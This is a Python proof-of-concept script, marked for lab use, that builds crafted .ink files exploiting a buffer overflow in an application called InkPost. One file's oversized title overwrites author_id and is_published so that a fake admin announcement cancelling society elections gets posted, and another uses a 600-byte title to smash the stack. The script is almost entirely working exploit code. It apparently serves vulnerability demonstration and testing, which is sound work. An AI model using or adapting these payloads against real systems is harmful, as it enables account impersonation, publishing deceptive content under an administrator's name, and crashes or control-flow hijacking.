#!/usr/bin/env python3
"""Generate .ink sample files for the VULN-1 (buffer overflow) demo.

LAB USE ONLY — run against your own local InkPost instance.

    python poc/make_ink.py --out poc/out --author-id 1

Creates:
  legit.ink           normal file (parses cleanly everywhere)
  bof_impersonate.ink 72-byte title: the last 8 bytes overwrite
                      is_published=1 and author_id=<author-id> (data corruption)
  bof_crash.ink       600-byte title: smashes the stack (crash / control flow)
"""
import argparse
import os
import struct


def make_ink(title: bytes, tags: bytes, body: bytes) -> bytes:
    return b"INK1" + struct.pack("<H", len(title)) + title + struct.pack("<H", len(tags)) + tags + body


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default="poc/out")
    ap.add_argument("--author-id", type=int, default=1, help="user id to impersonate (admin = 1)")
    args = ap.parse_args()
    os.makedirs(args.out, exist_ok=True)

    samples = {
        "legit.ink": make_ink(b"Weekend build log", b"robotics,log", b"## Day 1\n\nWe soldered everything twice."),
        "bof_impersonate.ink": make_ink(
            b"Official announcement".ljust(64, b" ") + struct.pack("<ii", 1, args.author_id),
            b"announcements",
            b"The society elections are cancelled. Please ignore any other emails.\n\n- The Admin",
        ),
        "bof_crash.ink": make_ink(b"A" * 600, b"", b"crash"),
    }
    for name, data in samples.items():
        path = os.path.join(args.out, name)
        with open(path, "wb") as f:
            f.write(data)
        print(f"wrote {path} ({len(data)} bytes)")


if __name__ == "__main__":
    main()
